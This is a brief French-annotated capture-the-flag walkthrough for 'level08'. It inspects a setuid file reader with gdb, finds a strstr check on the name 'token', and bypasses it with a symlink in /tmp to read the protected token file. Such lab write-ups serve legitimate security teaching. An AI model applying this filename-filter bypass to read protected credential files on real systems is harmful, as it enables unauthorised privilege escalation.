Qui suis-je? Ou suis-je?
$ ls -la
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
(un binaire setuid et un fichier "token")

$ ./level08
./level08 [file to read]

$ ./level08 level08
(Il affiche le fichier)

$ ./level08 token
You may not access 'token'

$ ./level08 .profile
level08: Unable to open .profile: Permission denied
(pas la meme erreur qu'avec token)

$ gdb level08 -> disas main
0x080485ba <+102>:	call   0x8048400 <strstr@plt>
(il doit comparer le nom "token")
(pas les droits pour cp ou mv dans /tmp)

$ ln -s /home/user/level08/token /tmp/link
$ ls -l /tmp/link
lrwxrwxrwx 1 level08 level08 24 Nov 28 15:24 /tmp/link -> /home/user/level08/token
(les droits ok)

$ ./level08 /tmp/link
(yeah)
